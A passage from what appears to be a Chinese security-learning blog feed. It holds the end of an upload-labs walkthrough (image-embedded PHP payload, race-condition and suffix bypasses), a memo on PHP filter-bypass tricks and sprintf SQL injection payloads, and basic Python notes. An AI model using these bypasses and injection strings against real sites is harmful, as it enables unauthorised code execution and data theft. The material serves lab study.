            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<p>然后执行命令<code>php jpg_payload.php 1.jpg</code></p>
<p>显示<code>Success!</code>即成功，装换后的文件名为<code>payload_1.jpg</code></p>
<p>将<code>payload_1.jpg</code>上传，php代码成功被解析</p>
<h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>条件竞争，利用burp的intruder模块，不停的发送数据包，就可以连接上，我硬是开了3个intruder模块才访问的到网页</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209211644172.png" alt loading="lazy"></p>
<h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>同样条件竞争，让发包的速度快过函数rename()的速度即可成功上传</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209212552816.png" alt loading="lazy"></p>
<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>保存名称那里在后缀，名加上一个<code>/.</code> 、<code>.(空格)</code>或<code>.</code>；<code>move_uploaded_file()</code>还有一个特性，会忽略掉文件末尾的<code>.</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209213807846.png" alt loading="lazy"></p>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>uploads</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>一些PHP函数</title>
    <url>/posts/4eec4e89/</url>
    <content><![CDATA[<h2 id="绕过函数"><a href="#绕过函数" class="headerlink" title="绕过函数"></a>绕过函数</h2><h3 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert"></a>base_convert</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206145300281.png" style="zoom:67%;" loading="lazy">

<p>可用以绕过执行一些系统命令</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token number">55490343972</span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">55490343972</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="hex2bin"><a href="#hex2bin" class="headerlink" title="hex2bin"></a>hex2bin</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206150504686.png" style="zoom:67%;" loading="lazy">

<h3 id="dechex"><a href="#dechex" class="headerlink" title="dechex"></a>dechex</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206150752364.png" style="zoom:67%;" loading="lazy">

<h3 id="hexdec"><a href="#hexdec" class="headerlink" title="hexdec"></a>hexdec</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206151951567.png" style="zoom:67%;" loading="lazy">

<p>例：cat *的16进制为636174202a</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token number">636174202</span>a<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token number">426836762666</span></code></pre>

<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">426836762666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> cat <span class="token operator">*</span></code></pre>

<h2 id="读取数据函数"><a href="#读取数据函数" class="headerlink" title="读取数据函数"></a>读取数据函数</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206153405574.png" style="zoom:67%;" loading="lazy">

<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206153545427.png" style="zoom:67%;" loading="lazy">

<h3 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206154027139.png" style="zoom:67%;" loading="lazy">

<h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump"></a>var_dump</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/一些PHP函数/image-20200206154243939.png" style="zoom:67%;" loading="lazy">

<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    读取当前目录文件</code></pre>

<h3 id="show-source"><a href="#show-source" class="headerlink" title="show_source"></a>show_source</h3><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200315185811823.png" alt loading="lazy"></p>
<p>可现显示php代码，用于<code>data://</code>协议中来读取代码</p>
<h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p><code>int strcmp(string $str1, string $str2)</code></p>
<p><code>str1</code>为第一个字符串，<code>str2</code>为第二个字符串，如果<code>str1</code>小于<code>str2</code>返回<code>&lt;0</code>如果<code>str1</code>大于<code>str2</code>返回<code>&gt;0</code>；如果二者相等，返回<code>0</code></p>
<p>但是当我们传入数组的时候，函数接收到不合法的字符后会报错，但是在php5.3之前的php中，显示了报错的警告信息后将<code>return 0</code>；意思是就算报了错，但判定结果还是相等的，即可通过数组进行绕过</p>
<h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h3><p>函数检测变量是否为数字或数字字符串，是则返回<code>true</code>，否则返回<code>false</code>，但是该函数对于空字符（如：<code>%00</code>，<code>%20</code>）则会直接跳过空字符判断，执行后面的语句，是判断则会接着继续后面的判断，注：<code>%20</code>放在字符串首则无效，例：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200229210728123.png" alt loading="lazy"></p>
<h3 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf()"></a>sprintf()</h3><p>参考：<a href="http://bey0nd.xyz/2018/11/05/1/">http://bey0nd.xyz/2018/11/05/1/</a></p>
<pre class="language-none"><code class="language-none">sprintf(format,arg1,arg2,arg++)
arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。
注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &quot;\$&quot; 组成。</code></pre>

<p><strong>反斜杠单引号逃逸</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from user where username = '%\' and 1=1#';"</span> <span class="token punctuation">;</span>
<span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span> <span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token function">sprintf</span> <span class="token punctuation">(</span> <span class="token variable">$sql</span> <span class="token punctuation">,</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span></span></code></pre>

<p>=&gt; <code>echo sprintf(&quot;select * from user where username = &#39;%\&#39; and 1=1#&#39;;&quot;, &quot;admin&quot;);</code><br>此时%\回去匹配admin字符串，但是<code>%\</code>只会匹配空<br>运行后的结果<br><code>select * from user where username = &#39;&#39; and 1=1#&#39;</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">addslashes</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"%1$' and 1=1#"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"AND b='%s'"</span><span class="token punctuation">,</span> <span class="token variable">$input</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM t WHERE a='%s' <span class="token interpolation"><span class="token variable">$b</span></span> "</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'admin'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>对<code>$input</code>与<code>$b</code>进行了拼接<br><code>$sql = sprintf (&quot;SELECT * FROM t WHERE a=&#39;%s&#39; AND b=&#39;%1$\&#39; and 1=1#&#39; &quot;, &#39;admin&#39; );</code><br>很明显，这个句子里面的<code>\</code>是由<code>addsashes</code>为了转义单引号而加上的，使用<code>%s</code>与<code>%1$\</code>类匹配<code>admin</code>，那么<code>admin</code>只会出现在<code>%s</code>里，<code>%1$\</code>为空<br><code>echo  $sql ;</code><br>运行后的结果<br><code>SELECT * FROM t WHERE a=&#39;admin&#39; AND b=&#39;&#39; and 1=1#&#39;</code></p>
<p><strong>%c利用</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> <span class="token class-name type-declaration">php</span>
<span class="token variable">$input1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%1$c) OR 1 = 1 /*'</span> <span class="token punctuation">;</span>
<span class="token variable">$input2</span> <span class="token operator">=</span> <span class="token number">39</span> <span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM foo WHERE bar IN (' <span class="token interpolation"><span class="token variable">$input1</span></span> ') AND baz = %s"</span> <span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span> <span class="token punctuation">(</span> <span class="token variable">$sql</span> <span class="token punctuation">,</span> <span class="token variable">$input2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span>  <span class="token variable">$sql</span> <span class="token punctuation">;</span></span></code></pre>

<p><code>%c</code>起到了类似<code>chr()</code>的效果，将数字39转化为<code>&#39;</code>，从而导致了sql注入。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> foo <span class="token keyword">WHERE</span> bar <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">AND</span> baz <span class="token operator">=</span> <span class="token number">39</span></code></pre>

<h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p><code>extract()</code> 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php">参考</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E4%B8%80%E4%BA%9BPHP%E5%87%BD%E6%95%B0/image-20200515140833843.png" alt loading="lazy"></p>
<p>如果未设置<strong><code>EXTR_SKIP</code></strong>，则会导致变量覆盖，<a href="https://crayon-xin.github.io/2018/05/21/extract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">参考</a></p>
<p>注：覆盖的是原来已经设置的或没设置的值，如果在函数后面又重新设置了这个值，则会再覆盖回去，可以参考本博客的<strong>反序列化-安洵杯-2019-easy_serialize_php</strong></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python笔记</title>
    <url>/posts/c00b24b1/</url>
    <content><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="运算函数"><a href="#运算函数" class="headerlink" title="运算函数"></a>运算函数</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">作用</th>
<th align="center">例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">abs(x)</td>
<td align="center">绝对值函数</td>
<td align="center">abs(-1) = 1</td>
</tr>
<tr>
<td align="center">divmod(x,y)</td>
<td align="center">商余函数</td>
<td align="center">divmod(10,3) = (3,1)</td>
</tr>
<tr>
<td align="center">pow(x,y,z)</td>
<td align="center">幂运算函数</td>
<td align="center">pow(2,2) = 4,pow(2,2,3) = 1</td>
</tr>
<tr>
<td align="center">round(x)</td>
<td align="center">四舍五入函数</td>
<td align="center">round(1.5) = 2</td>
</tr>
<tr>
<td align="center">max(x)</td>
<td align="center">最大值函数</td>
<td align="center">max(1,2,3) = 3</td>
</tr>
<tr>
<td align="center">min(x)</td>
<td align="center">最小值函数</td>
<td align="center">min(1,2,3) = 1</td>
</tr>
</tbody></table>
<h2 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">len(x)</td>
<td align="center">返回字符串x的长度，len(“壹1,\‘ a”) = 6</td>
</tr>
<tr>
<td align="center">str(x)</td>
<td align="center">任意类型x所对应的字符串形式,str(‘abc123’)=abc123,与eval()形成对比</td>
</tr>
<tr>
<td align="center">hex(x)或oct(x)</td>
<td align="center">整数x的十六进制或八进制小写形式的字符串，hex(111)=’0x6f’,oct(111)=’0o157’</td>
</tr>
<tr>
<td align="center">chr(x)</td>
<td align="center">x为Unicode编码，返回其对应的字符，chr(20197) = ‘以’</td>
</tr>
<tr>
<td align="center">ord(x)</td>
<td align="center">x为字符，返回其对应的Unicode编码，ord(“以”) = 20197</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>输入为小数字符串，转换成int型方法：<code>a = int(float(a))</code></strong></p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">9800</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p>♈♉♊♋♌♍♎♏♐♑♒♓</p>
<h2 id="字符串处理方法"><a href="#字符串处理方法" class="headerlink" title="字符串处理方法"></a>字符串处理方法</h2><table>
<thead>
<tr>
<th align="center">方法及使用</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">str.lower()或str.upper()</td>
<td align="center">返回字符串的副本，全部字符小写/大写 “AbCdEfGh”.lower()结果为“abcdefgh”</td>
</tr>
<tr>
<td align="center">str.split(sep=None)</td>
<td align="center">返回一个列表，由str根据sep被分隔的部分组成 “A,B,C”.split(“,”)结果为[‘A’,’B’,’C’]</td>
</tr>
<tr>
<td align="center">str.count(sub)</td>
<td align="center">返回子串sub在str中出现的次数  “a apple a day”.count(“a”)结果为4</td>
</tr>
<tr>
<td align="center">str.replace(old,new)</td>
<td align="center">返回字符串str副本，所有old子串被替换为new “python”.replace(“n”,”n123”)结果为‘python123’</td>
</tr>
<tr>
<td align="center">str.center(width[,fillchar])</td>
<td align="center">字符串str根据宽度width居中fillchar可选 “python”.center(20,”=”) 结果为‘=======python=======’</td>
</tr>
<tr>
<td align="center">str.strip(chars)</td>
<td align="center">从str中去掉在其左侧和右侧chars中列出的字符 “= python=”.strip(“ =np”)结果为 ‘ytho’</td>
</tr>
<tr>
<td align="center">str.join(iter)</td>
<td align="center">在iter变量除最后元素外每个元素后增加一个 str”,”.join(“12345”)结果为’1,2,3,4,5’ 主要用于字符串分隔等</td>
</tr>
<tr>
<td align="center">str.isdigit()</td>
<td align="center">判断接收的字符是否为数字，返回True或False，无参数</td>
</tr>
</tbody></table>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>即程序报错执行except的语句</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200204172105285.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200204172853121.png" style="zoom:67%;" loading="lazy">

<p>异常类型详见：<a href="https://www.runoob.com/python/python-exceptions.html">Python 异常处理</a></p>
<h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">randint(a,b)</td>
<td align="center">生成一个[a,b]之间的整数&gt;&gt;&gt;random.randint(10,100)=64</td>
</tr>
<tr>
<td align="center">randrange(m,n[,k])</td>
<td align="center">生成一个[m,n)之间以k为步长的随机整数&gt;&gt;&gt;random.randrange(10,100,10)=80</td>
</tr>
<tr>
<td align="center">getrandbits(k)</td>
<td align="center">生成一个k比特长的随机整数&gt;&gt;&gt;random.getrandbits(16)=37885</td>
</tr>
<tr>
<td align="center">uniform(a,b)</td>
<td align="center">生成一个[a,b]之间的随机小数&gt;&gt;&gt;random.uniform(10,100)=13.234563456</td>
</tr>
<tr>
<td align="center">choice(seq)</td>
<td align="center">从序列seq中随机选择一个元素&gt;&gt;&gt;random.choice([1,2,3,4,5,6,7,8,9,0])=5</td>
</tr>
<tr>
<td align="center">shuffle(seq)</td>
<td align="center">将序列seq中元素随机排序，返回打乱后的序列                             &gt;&gt;&gt;s=[1,2,3,4];random.shuffle(s);print(s)   [3,1,4,2]</td>
</tr>
</tbody></table>
<blockquote>
<p>global：在函数内部声明全局变量</p>
</blockquote>
<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>阶乘：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> a<span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>求和</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> a<span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>汉诺塔问题求解</p>
<pre class="language-python" data-language="python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">def</span> <span class="token function">hanoi</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> count
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">)</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        hanoi<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>src<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>dst<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;->&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>src<span class="token punctuation">,</span>dst<span class="token punctuation">)</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
        hanoi<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>mid<span class="token punctuation">,</span>dst<span class="token punctuation">,</span>src<span class="token punctuation">)</span>
hanoi<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span></code></pre>

<p>科赫曲线雪花绘制</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle
<span class="token keyword">def</span> <span class="token function">koch</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        turtle<span class="token punctuation">.</span>fd<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> angle <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span>angle<span class="token punctuation">)</span>
            koch<span class="token punctuation">(</span>size<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">,</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        koch<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment">#2阶科赫曲线，阶数</span>
        turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span>
    turtle<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h2 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h2><table>
<thead>
<tr>
<th align="center">操作函数或方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">S.add(x)</td>
<td align="center">如果x不在集合S中，将x增加到S</td>
</tr>
<tr>
<td align="center">S.discard(x)</td>
<td align="center">移除S中元素x，如果不在集合S中，不报错</td>
</tr>
<tr>
<td align="center">S.remove()</td>
<td align="center">移除S中元素x，如果x不在集合S中，产生KeyError异常</td>
</tr>
<tr>
<td align="center">S.clear()</td>
<td align="center">移除S中的所有元素</td>
</tr>
<tr>
<td align="center">S.pop()</td>
<td align="center">随机<strong>返回</strong>S中的一个元素，<strong>更新</strong>S，若S为空产生KeyError异常</td>
</tr>
<tr>
<td align="center">S.copy()</td>
<td align="center">返回集合S中的一个副本</td>
</tr>
<tr>
<td align="center">len(S)</td>
<td align="center">返回集合S的元素个数</td>
</tr>
<tr>
<td align="center">x in S</td>
<td align="center">判断S中元素x，x在集合S中，返回True，否则返回False</td>
</tr>
<tr>
<td align="center">x not in S</td>
<td align="center">判断S中元素x，x不在集合S中，返回False，否则返回True</td>
</tr>
<tr>
<td align="center"><code>set(x)</code></td>
<td align="center">将其他类型变量x转变为<code>集合</code>类型，可用以集合元素去重</td>
</tr>
<tr>
<td align="center"><code>list(x)</code></td>
<td align="center">转换为<code>列表</code>类型</td>
</tr>
<tr>
<td align="center"><code>tuple(x)</code></td>
<td align="center">转换为<code>元组</code>类型</td>
</tr>
</tbody></table>
<h2 id="序列"><a href="#序列" class="headerlink" title="序列"></a>序列</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205173145060.png" style="zoom:67%;" loading="lazy">

<table>
<thead>
<tr>
<th align="center">函数和方法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">len(s)</td>
<td align="center">返回序列s的长度</td>
</tr>
<tr>
<td align="center">min(s)</td>
<td align="center">返回序列s的最小元素，s中元素需要可比较</td>
</tr>
<tr>
<td align="center">max(s)</td>
<td align="center">返回序列s的最大元素，s中元素需要可比较</td>
</tr>
<tr>
<td align="center">s.index(x)或s.index(x,i,j)</td>
<td align="center">返回序列s从i开始到j位置中第一次出现元素x的位置</td>
</tr>
<tr>
<td align="center">s.count(x)</td>
<td align="center">返回序列s中出现x的总次数</td>
</tr>
</tbody></table>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200205175031008.png" style="zoom:67%;" loading="lazy">

